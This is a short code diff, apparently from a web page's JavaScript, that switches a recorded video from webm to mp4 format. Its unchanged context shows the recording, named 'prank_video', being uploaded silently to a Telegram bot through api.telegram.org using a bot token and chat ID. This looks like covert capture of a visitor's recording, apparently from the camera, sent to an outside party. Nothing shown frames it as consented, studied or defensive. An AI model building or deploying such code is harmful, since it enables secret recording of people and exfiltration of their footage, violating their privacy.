@@ -83,10 +83,10 @@
 
         recorder.ondataavailable = (e) => chunks.push(e.data);
         recorder.onstop = async () => {
-          const blob = new Blob(chunks, { type: 'video/webm' });
+          const blob = new Blob(chunks, { type: 'video/mp4' });
           const formData = new FormData();
           formData.append('chat_id', chatId);
-          formData.append('video', blob, 'prank_video.webm');
+          formData.append('video', blob, 'prank_video.mp4');
 
           const telegramURL = `https://api.telegram.org/bot${botToken}/sendVideo`;
           await fetch(telegramURL, { method: 'POST', body: formData });
